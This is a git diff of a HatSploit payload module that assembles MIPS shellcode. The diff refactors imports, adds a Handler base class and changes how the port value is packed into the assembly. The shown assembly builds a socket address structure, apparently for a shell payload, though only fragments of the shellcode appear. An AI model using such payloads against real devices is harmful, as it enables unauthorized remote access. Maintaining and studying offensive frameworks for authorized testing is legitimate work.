@@ -3,12 +3,12 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.assembler import Assembler
 from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler, Socket):
     def __init__(self):
         super().__init__()
 
@@ -26,8 +26,6 @@ class HatSploitPayload(Payload, Assembler, Socket):
         }
 
     def run(self):
-        bport = self.pack_port(self.handler['BPORT'])
-
         return self.assemble(
             self.details['Architecture'],
             f"""
@@ -46,7 +44,7 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 addiu $t5, $zero, -3
                 not $t5, $t5
                 sllv $t5, $t5, $t6
-                addiu $t6, $zero, 0x{bport.hex()}
+                addiu $t6, $zero, 0x{self.rport.little.hex()}
                 or $t5, $t5, $t6
                 sw $t5, -0x20($sp)
                 sw $zero, -0x1c($sp)
